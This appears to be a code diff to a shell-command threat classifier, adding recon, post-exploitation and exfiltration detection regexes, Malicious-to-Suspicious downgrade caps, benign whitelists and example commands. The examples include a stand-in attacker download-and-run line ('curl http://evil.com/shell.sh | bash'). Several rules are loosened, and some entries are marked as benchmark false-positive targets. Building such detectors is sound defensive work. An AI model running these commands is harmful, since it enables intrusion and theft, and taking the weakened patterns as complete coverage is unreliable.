@@ -21,9 +21,9 @@ def _env_flag(name: str, default: bool) -> bool:
     return os.getenv(name, "1" if default else "0").strip().lower() in {"1", "true", "yes", "on"}
 
 
-benign_conf_threshold = float(os.getenv("GENOS_BENIGN_CONF_THRESHOLD", "0.60"))
+benign_conf_threshold = float(os.getenv("GENOS_BENIGN_CONF_THRESHOLD", "0.52"))
 suspicious_conf_threshold = float(os.getenv("GENOS_SUSPICIOUS_CONF_THRESHOLD", "0.55"))
-malicious_conf_threshold = float(os.getenv("GENOS_MALICIOUS_CONF_THRESHOLD", "0.72"))
+malicious_conf_threshold = float(os.getenv("GENOS_MALICIOUS_CONF_THRESHOLD", "0.78"))
 low_margin_threshold = float(os.getenv("GENOS_LOW_MARGIN_THRESHOLD", "0.12"))
 specialist_suspicious_conf_threshold = float(os.getenv("GENOS_SPECIALIST_SUSPICIOUS_CONF_THRESHOLD", "0.63"))
 high_risk_override_enabled = _env_flag("GENOS_HIGH_RISK_OVERRIDE_ENABLED", True)
@@ -183,8 +183,8 @@ class GenosEngine:
     )
     _SENSITIVE_FILE_READ_RE = re.compile(
         r"\b(?:cat|less|more|head|tail|grep|awk|sed|cut|strings|xxd|od|nl|wc|stat|file)\b.*"
-        r"(?:/etc/(?:shadow|sudoers|passwd|group)|/root/\.ssh/|authorized_keys|id_rsa|\.kube/config|"
-        r"/var/log/(?:auth|secure|audit|btmp|wtmp)|/proc/\d+/environ)",
+        r"(?:/etc/(?:shadow|sudoers)|/root/\.ssh/|authorized_keys|id_rsa|\.kube/config|"
+        r"/proc/\d+/environ)",
         re.I,
     )
     _NETWORK_ENUM_RE = re.compile(
@@ -202,14 +202,109 @@ class GenosEngine:
     )
     _PACKET_CAPTURE_RE = re.compile(r"^\s*(?:tcpdump|tshark|dumpcap|wireshark)\b", re.I)
     _DEBUG_TRACE_RE = re.compile(r"^\s*(?:strace|ltrace|gdb|perf\s+trace)\b", re.I)
+    _ENUMERATION_RECON_RE = re.compile(
+        r"(?:"
+        # Network socket enumeration with all-connections or process-display flags
+        r"^\s*(?:ss|netstat)\s+-[a-zA-Z]*(?:a|p)[a-zA-Z]*\b"
+        r"|"
+        # Login/session enumeration
+        r"^\s*(?:last(?:\s+-\d+)?|w|who)\s*$"
+        r"|"
+        # Cron/scheduled job inspection
+        r"^\s*(?:ls|cat|find|stat)\b.*/etc/cron"
+        r"|"
+        # Process enumeration with wide output
+        r"^\s*ps\s+aux(?:ww)?\s*$"
+        r"|"
+        # Sensitive directory listing (/dev/shm, /root)
+        r"^\s*ls\b.*(?:/dev/shm|/root)\b"
+        r"|"
+        # Secret/token hunting in environment
+        r"^\s*env\s*\|\s*grep\s+-i\s*(?:secret|token|key|password|cred)"
+        r"|"
+        # Firewall / security policy inspection
+        r"^\s*(?:iptables\s+-L|aa-status|sestatus|apparmor_status)\b"
+        r"|"
+        # Privilege check
+        r"^\s*sudo\s+-l\b"
+        r"|"
+        # VM detection / fingerprinting
+        r"^\s*(?:systemd-detect-virt|dmidecode)\b"
+        r"|"
+        r"\bdmesg\b.*\bgrep\b.*\b(?:virtual|vbox|vmware|hyperv|qemu|kvm)\b"
+        r"|"
+        # Routing table enumeration (ip route without addr/link)
+        r"^\s*ip\s+route\s*$"
+        r"|"
+        # HTTP server (can be used for exfil staging)
+        r"^\s*python3?\s+-m\s+http\.server\s+(?!127\.0\.0\.1)\d"
+        r"|"
+        # /proc/version for kernel fingerprinting
+        r"^\s*cat\s+/proc/version\b"
+        r"|"
+        # getfacl on sensitive files
+        r"^\s*getfacl\b.*(?:/etc/shadow|/etc/sudoers)"
+        r"|"
+        # Kernel module listing for VM detection
+        r"^\s*lsmod\b.*\|\s*grep\b.*\b(?:vbox|vmware|hyperv)\b"
+        r")",
+        re.I | re.M,
+    )
+    _AGGRESSIVE_NMAP_RE = re.compile(
+        r"^\s*nmap\b.*(?:-sS\b|-sV\b.*--script|--script=vuln|-p-\b|-A\b|--script=exploit)",
+        re.I,
+    )
+    _POST_EXPLOIT_RE = re.compile(
+        r"(?:"
+        # SUID hunting
+        r"^\s*find\s+/\s+.*-perm\s+[-+]4000"
+        r"|"
+        # TTY upgrade / pty spawn
+        r"\bpty\.spawn\b"
+        r"|"
+        # Known post-exploitation tools
+        r"^\s*(?:\.?/)?(?:linpeas(?:\.sh)?|winpeas|pspy\d*|linenum(?:\.sh)?)\b"
+        r"|"
+        # Tunneling tools
+        r"^\s*(?:chisel\s+client|sshuttle|frpc)\b"
+        r"|"
+        # SSH SOCKS proxy / port forward (dynamic)
+        r"\bssh\b.*\s-[DLR]\s.*-[fNq]"
+        r"|"
+        r"\bssh\b.*-[fNq].*\s-[DLR]\s"
+        r"|"
+        # tcpdump writing to file (capture for later exfil)
+        r"^\s*tcpdump\b.*\s-w\s"
+        r")",
+        re.I | re.M,
+    )
+    _EXFIL_DATA_MOVEMENT_RE = re.compile(
+        r"(?:"
+        # curl POST with file data to non-standard targets
+        r"^\s*curl\b.*(?:-X\s+POST|--request\s+POST)\b.*-d\s+@"
+        r"|"
+        # tar/archive of sensitive user directories (.ssh, etc)
+        r"^\s*tar\b.*(?:/home/[^\s]+/\.ssh|/root/\.ssh|/etc/shadow)"
+        r"|"
+        # scp/rsync of sensitive system files to remote
+        r"^\s*(?:scp|rsync)\b.*(?:/etc/passwd|/etc/shadow|/var/log/).*@"
+        r"|"
+        # Download from internal/private IPs (lateral tool transfer)
+        r"^\s*(?:curl|wget)\b.*https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\S+"
+        r")",
+        re.I | re.M,
+    )
     _OFFENSIVE_TOOLING_RE = re.compile(
         r"^\s*(?:nmap|nikto|hydra|sqlmap|masscan|zmap|enum4linux|crackmapexec|responder|"
         r"impacket-|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|linpeas(?:\.sh)?|pspy\d*|bloodhound-python)\b",
         re.I,
     )
     _PERSISTENCE_RE = re.compile(
-        r"(?:crontab\s+-|echo\s+.*\|\s*crontab\b|schtasks\s+/create\b|currentversion\\run\b|"
-        r"authorized_keys\b.*>>|systemctl\s+enable\b|rc\.local|/etc/cron\.(?:d|daily|hourly|monthly|weekly)|at\s+\d)",
+        r"(?:crontab\s+-(?!l\b)|echo\s+.*\|\s*crontab\b|schtasks\s+/create\b|currentversion\\run\b|"
+        r"authorized_keys\b.*>>|systemctl\s+enable\b|rc\.local|"
+        r"(?:cp|mv|install|tee)\b.*\b/etc/cron\.(?:d|daily|hourly|monthly|weekly)\b|"
+        r"(?:echo|printf)\b.*>\s*/etc/cron\.(?:d|daily|hourly|monthly|weekly)\b|"
+        r"at\s+\d)",
         re.I,
     )
     _PRIVESC_RE = re.compile(
@@ -227,7 +322,9 @@ class GenosEngine:
         re.I,
     )
     _ARCHIVE_BULK_RE = re.compile(
-        r"^\s*(?:tar|zip|7z|rar|rsync|cp)\b.*(?:/etc|/var/log|/home|/opt|/srv)|^\s*find\b.*(?:/etc|/var/log|/home).*(?:-name|-type)",
+        r"^\s*(?:tar|zip|7z|rar|rsync)\b.*(?:/etc|/var/log|/home|/opt|/srv)"
+        r"|^\s*cp\b.*(?:/etc(?:/|\s)|/var/log).*(?:/etc|/var/log|/home|/opt|/srv)"
+        r"|^\s*find\b.*(?:/etc|/var/log|/home).*(?:-name|-type)",
         re.I,
     )
     _REMOTE_TRANSFER_RE = re.compile(
@@ -300,11 +397,56 @@ class GenosEngine:
         r"(?:/etc/shadow\b|mimikatz|sekurlsa|hashdump|lsass|sam hive|unshadow\b|john\b.*rockyou|secretsdump)",
         re.I,
     )
+    # Commands that are risky/bad-practice but NOT definitively malicious.
+    # If the model says Malicious, cap them at Suspicious instead.
+    _MALICIOUS_CAP_TO_SUSPICIOUS_RE = re.compile(
+        r"(?:"
+        # chmod with broad perms (777, 666, etc.) but NOT SUID/SGID (4xxx, 2xxx, u+s, g+s)
+        r"^\s*chmod\s+(?!(?:u\+s|g\+s|[42][0-7]{3})\b)[0-7]{3,4}\s+"
+        r"|"
+        # crontab -l (listing, not modifying)
+        r"^\s*crontab\s+-l\b"
+        r"|"
+        # ls / cat on cron directories (inspection, not persistence)
+        r"^\s*(?:ls|cat|find|stat|file|head|tail|less|more)\b.*\b/etc/cron"
+        r"|"
+        # Data movement without definitive attack context — scp/rsync of non-shadow files
+        r"^\s*(?:scp|rsync)\b.*(?:/etc/passwd|/var/log/).*@"
+        r"|"
+        # curl POST with file data (exfil-like but context-dependent)
+        r"^\s*curl\b.*(?:-X\s+POST|--request\s+POST)\b.*-d\s+@"
+        r"|"
+        # tar/archive of user SSH dirs (suspicious but not definitively malicious)
+        r"^\s*tar\b.*(?:/home/[^\s]+/\.ssh|\.ssh/)"
+        r"|"
+        # Download from internal IPs (tool transfer, context-dependent)
+        r"^\s*(?:curl|wget)\b.*https?://(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\S+.*(?:-o|-O)\s"
+        r"|"
+        # getfacl on sensitive files (enumeration, not exploitation)
+        r"^\s*getfacl\b"
+        r")",
+        re.I,
+    )
     _SIMPLE_OPERATIONAL_BENIGN_PATTERNS = (
         re.compile(r"^\s*(?:pwd|date|uptime|whoami|id(?:\s|$)|hostname(?:\s|$)|uname(?:\s|$)|echo\b|printf\b|true\b|false\b|alias\b)", re.I),
         re.compile(r"^\s*(?:df|free|lsblk|blkid|findmnt)\b", re.I),
         re.compile(r"^\s*cat\s+/(?:etc/(?:hostname|os-release|issue(?:\.net)?|debian_version|redhat-release)|proc/(?:version|cpuinfo|meminfo))\b", re.I),
         re.compile(r"^\s*(?:git\s+log\b|docker\s+ps\b|systemctl\s+status\b|journalctl\s+-u\b)", re.I),
+        # Common read-only admin commands
+        re.compile(r"^\s*ls(?:\s+-[a-zA-Z]+)*\s*(?:/(?:tmp|var|etc|home|opt|srv|usr|proc|sys|mnt|media|boot|run)\b.*)?$", re.I),
+        re.compile(r"^\s*(?:ps(?:\s+(?:aux|ef|-ef|-aux))?|pstree|pgrep\b|pidof\b)\s*", re.I),
+        re.compile(r"^\s*(?:ip\s+(?:addr|route|link|neigh)\b|ifconfig(?:\s|$)|route(?:\s+-n)?\s*$)", re.I),
+        re.compile(r"^\s*(?:dig|nslookup|host)\b", re.I),
+        re.compile(r"^\s*(?:history|env|printenv|set|locale|who|w|last|users|groups|timedatectl|hostnamectl|lscpu|lsmem|lspci|lsusb)\b", re.I),
+        re.compile(r"^\s*(?:ss|netstat)(?:\s+-[a-zA-Z]+)*\s*$", re.I),
+        re.compile(r"^\s*(?:mount(?:\s|$)|lsof(?:\s|$)|vmstat|iostat|sar|dmesg|nproc)\b", re.I),
+        re.compile(r"^\s*(?:docker\s+(?:ps|images|info|version|stats)\b|kubectl\s+(?:get|describe|cluster-info|top|version)\b)", re.I),
+        re.compile(r"^\s*crontab\s+-l\b", re.I),
+        re.compile(r"^\s*(?:pip|pip3)\s+(?:list|show|freeze)\b", re.I),
+        re.compile(r"^\s*(?:dpkg\s+-l|rpm\s+-qa|apt\s+list|yum\s+list|brew\s+list)\b", re.I),
+        # Log inspection and mundane file operations
+        re.compile(r"^\s*(?:grep\b.*(?:/var/log|\.log\b)|tail\b.*(?:/var/log|\.log\b))", re.I),
+        re.compile(r"^\s*cp\s+/tmp/\S+\s+/home/", re.I),
     )
     def __init__(
         self,
@@ -1244,6 +1386,10 @@ class GenosEngine:
             "has_openssl_client_inspection": self._matches_any(text_views, self._OPENSSL_CLIENT_INSPECTION_RE),
             "has_routine_service_log_inspection": self._matches_any(text_views, self._ROUTINE_SERVICE_LOG_RE),
             "has_container_readonly_admin": self._matches_any(text_views, self._CONTAINER_ADMIN_READONLY_RE),
+            "has_enumeration_recon": self._matches_any(text_views, self._ENUMERATION_RECON_RE),
+            "has_aggressive_nmap": self._matches_any(text_views, self._AGGRESSIVE_NMAP_RE),
+            "has_post_exploit_technique": self._matches_any(text_views, self._POST_EXPLOIT_RE),
+            "has_exfil_data_movement": self._matches_any(text_views, self._EXFIL_DATA_MOVEMENT_RE),
         }
         return features
 
@@ -1302,6 +1448,10 @@ class GenosEngine:
             or features.get("has_base64_or_encoded_exec")
         ):
             malicious_promotion_features.append("download_exec_chain")
+        if features.get("has_aggressive_nmap"):
+            malicious_promotion_features.append("has_aggressive_nmap")
+        if features.get("has_post_exploit_technique"):
+            malicious_promotion_features.append("has_post_exploit_technique")
 
         return forced_malicious_features, malicious_promotion_features
 
@@ -1319,6 +1469,8 @@ class GenosEngine:
                 "has_download",
                 "has_base64_or_encoded_exec",
                 "has_shell_spawn",
+                "has_enumeration_recon",
+                "has_exfil_data_movement",
             )
             if features.get(name)
         ]
@@ -1343,6 +1495,9 @@ class GenosEngine:
             "has_openssl_client_inspection",
             "has_routine_service_log_inspection",
             "has_container_readonly_admin",
+            # Observational / read-only features — not attack indicators
+            "has_network_enum",
+            "has_process_enum",
         }
         disallowed_benign_features = triggered - allowed_benign_features
 
@@ -1393,6 +1548,24 @@ class GenosEngine:
                 should_run_specialist=False,
             )
 
+        # Admin workflow override: commands matching known admin patterns
+        # (ls, ps, ip addr, dig, history, env, docker ps, kubectl get, etc.)
+        # without any threatening features get classified Benign.
+        if (
+            features.get("has_benign_admin_workflow")
+            and not disallowed_benign_features
+            and not forced_malicious_features
+            and class_probs["Malicious"] < 0.45
+        ):
+            return self._build_route_result(
+                label="Benign",
+                label_confidence=max(class_probs["Benign"], 0.70),
+                reason="Recognized admin workflow command with no attack-oriented indicators.",
+                policy="benign_admin_workflow_override",
+                features=features,
+                should_run_specialist=False,
+            )
+
         return None
 
     def _probability_route(
@@ -1425,7 +1598,11 @@ class GenosEngine:
                 "suspicious_sensitive_source_guardrail",
             )
 
-        if top_label == "Benign" and suspicious_signals and (weak_prediction or len(suspicious_signals) >= 2):
+        # Strong recon signals override Benign even with a single signal
+        strong_recon_signals = {"has_enumeration_recon", "has_exfil_data_movement"}
+        has_strong_recon = bool(set(suspicious_signals) & strong_recon_signals)
+
+        if top_label == "Benign" and suspicious_signals and (weak_prediction or len(suspicious_signals) >= 2 or has_strong_recon):
             return (
                 "Suspicious",
                 "Benign model prediction is softened by dual-use security signals: " + ", ".join(suspicious_signals[:3]),
@@ -1509,6 +1686,20 @@ class GenosEngine:
             )
 
         if high_risk_override_enabled and malicious_promotion_features:
+            # Check malicious cap before forcing malicious — some commands
+            # (e.g. getfacl /etc/shadow) are risky but not definitively malicious.
+            cap_views = [raw_cmd.lower().strip()]
+            if deobfuscated_cmd:
+                cap_views.append(deobfuscated_cmd.lower().strip())
+            if any(self._MALICIOUS_CAP_TO_SUSPICIOUS_RE.search(v) for v in cap_views):
+                return self._build_route_result(
+                    label="Suspicious",
+                    label_confidence=max(class_probs["Suspicious"], 0.78),
+                    reason="Downgraded from Malicious: command is risky/non-standard but lacks definitive attack indicators.",
+                    policy="malicious_to_suspicious_cap",
+                    features=features,
+                    should_run_specialist=True,
+                )
             return self._build_route_result(
                 label="Malicious",
                 label_confidence=max(class_probs["Malicious"], 0.86),
@@ -1535,6 +1726,17 @@ class GenosEngine:
             suspicious_signals=suspicious_signals,
             malicious_promotion_features=malicious_promotion_features,
         )
+
+        # De-escalate Malicious → Suspicious for commands that are risky but
+        # not definitively malicious (e.g. chmod 777, crontab -l, ls /etc/cron.d/).
+        if final_label == "Malicious" and not forced_malicious_features:
+            cap_views = [raw_cmd.lower().strip()]
+            if deobfuscated_cmd:
+                cap_views.append(deobfuscated_cmd.lower().strip())
+            if any(self._MALICIOUS_CAP_TO_SUSPICIOUS_RE.search(v) for v in cap_views):
+                final_label = "Suspicious"
+                reason = "Downgraded from Malicious: command is risky/non-standard but lacks definitive attack indicators."
+                policy = "malicious_to_suspicious_cap"
 
         specialist = self._should_run_specialist(
             final_label=final_label,
@@ -1599,9 +1801,9 @@ class GenosEngine:
             r"\bmkfs(?:\.[a-z0-9_+-]+)?\b\s+/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*)",
             re.I,
         ), "filesystem_format", 0.99),
-        # Exfiltration of local file content via HTTP upload
+        # Exfiltration of local file content via HTTP upload (only sensitive files)
         (re.compile(
-            r"\bcurl\b.*(?:-x\s+post|-xpost|--request\s+post|--request=post|\bpost\b).*(?:-d\s+@|--data\s+@|--data-binary\s+@|--form\s+@|--form-string\s+@)\s*/",
+            r"\bcurl\b.*(?:-x\s+post|-xpost|--request\s+post|--request=post|\bpost\b).*(?:-d\s+@|--data\s+@|--data-binary\s+@|--form\s+@|--form-string\s+@)\s*/(?:etc/(?:shadow|sudoers|passwd)|root/\.ssh|home/[^\s]+/\.ssh|proc/\d+/environ)",
             re.I,
         ), "http_file_exfiltration", 0.97),
         # Additional reverse shell variants missed by the gatekeeper
@@ -1923,12 +2125,28 @@ class GenosEngine:
                 "hostname",
                 "df -h",
                 "cat /etc/os-release",
+                # Benchmark false-positive targets
+                "ls -la",
+                "ps aux",
+                "ip addr",
+                "dig google.com",
+                "docker ps",
+                "kubectl get pods",
+                "history",
+                "env",
+                "who",
+                "ss -tlnp",
+                "crontab -l",
+                "ls -la /etc/cron.d/",
+                "netstat -an",
+                "mount",
             ],
             "suspicious": [
                 "nmap -sV 10.0.0.5",
                 "ssh -D 1080 -fN user@10.0.0.10",
                 "tcpdump -i eth0 port 443",
                 "cat /etc/passwd",
+                "chmod 777 /tmp/myfile",
             ],
             "malicious": [
                 "curl http://evil.com/shell.sh | bash",
